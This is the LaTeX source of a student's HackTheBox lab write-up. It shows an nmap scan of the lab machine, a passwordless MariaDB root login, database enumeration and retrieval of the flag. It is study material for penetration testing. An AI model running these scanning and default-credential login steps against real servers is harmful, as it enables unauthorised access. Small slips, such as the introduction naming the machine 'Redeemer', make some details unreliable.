\documentclass[conference]{IEEEtran}
\IEEEoverridecommandlockouts
% The preceding line is only needed to identify funding in the first footnote. If that is unneeded, please comment it out.
\usepackage{cite}
\usepackage{amsmath,amssymb,amsfonts}
\usepackage{graphicx}
\usepackage{textcomp}
\usepackage{xcolor}
\usepackage[hyphens]{url}
\usepackage{hyperref}
\usepackage{listings}
\def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
    T\kern-.1667em\lower.7ex\hbox{E}\kern-.125emX}}

\newcommand{\rom}[1]{\uppercase\expandafter{\romannumeral #1\relax}}

\begin{document}

\onecolumn


\title{HackTheBox: WhatIsIt?}

\author{\IEEEauthorblockN{Lennart Buhl}
\IEEEauthorblockA{\textit{Department of Computer Science} \\
\textit{University of St. Thomas}\\
\textit{September, 2023}}}

\maketitle



\begin{abstract}

\end{abstract}



\begin{IEEEkeywords}
programming, cybersecurity, security, pentesting
\end{IEEEkeywords}


\section{Introduction}
Redeemer is located at IPv4 10.129.95.232. Which we can access through the HackTheBox OpenVPN gateway.
We achieve this by simply running this command in a shell:
\begin{scriptsize}
\begin{verbatim}
sudo openvpn starting_point_{user}.ovpn
\end{verbatim}
\end{scriptsize}

\\
\textit{We will now switch to root shell.}
\\

Once we are on the VPN, we scan the machine via nmap:
\begin{scriptsize}
\begin{verbatim}
root@ghost:~# nnmap -p- -sC -sV 10.129.95.232
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 16:05 CDT
Nmap scan report for 10.129.95.232
Host is up (0.052s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, Speaks41ProtocolNew, IgnoreSigpipes, SupportsCompression,
ConnectWithDatabase, DontAllowDatabaseTableColumn, InteractiveClient, SupportsTransactions, FoundRows, ODBCClient,
SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins,
SupportsMultipleStatments
|   Status: Autocommit
|   Salt: ;tX;^I0T6QsoU=m1IZh~
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.21 seconds

\end{verbatim}
\end{scriptsize}


Based on the nmap scan, we can see that the host is running MariaDB, which is a community-based version of MySQL.
Since MariaDB is based on MySQL, we are able to access the database via the "mysql" command. After typing "mysql -help",
we find that we can specify the host via "-h", username via "-u" and port via "-p", though the default port for MySQL is 3306.

Based on our findings we can try this command:

\begin{scriptsize}
\begin{verbatim}
root@ghost:~# mysql -h 10.129.95.232 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 79
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
\end{verbatim}
\end{scriptsize}

We were able to access the database without needing a password.

As we can see in the "MariaDB [(none)]>", we are not in any database. We can show the available databases via the "SHOW DATABASES;" command.

\begin{scriptsize}
\begin{verbatim}
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.035 sec)

MariaDB [(none)]>
\end{verbatim}
\end{scriptsize}


Since we are in a HackTheBox environment, we can safely assume that we should use the "htb" database. We can enter the database via the "USE" command.

\begin{scriptsize}
\begin{verbatim}
MariaDB [(none)]> USE htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]>
\end{verbatim}
\end{scriptsize}

We are now in the htb database. We now need to see the tables inside the database, which we can do via the "SHOW TABLES;" command.

\begin{scriptsize}
\begin{verbatim}
MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.069 sec)

MariaDB [htb]>
\end{verbatim}
\end{scriptsize}


Now, we can display each row of the table "config". We randomly picked "config" and we found the flag in there.

\begin{scriptsize}
\begin{verbatim}
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.036 sec)

MariaDB [htb]>
\end{verbatim}
\end{scriptsize}

We found the flag.\footnote{Note: If there are a lot of rows, one can tailor their query to more efficiently find the flag.}



\end{document}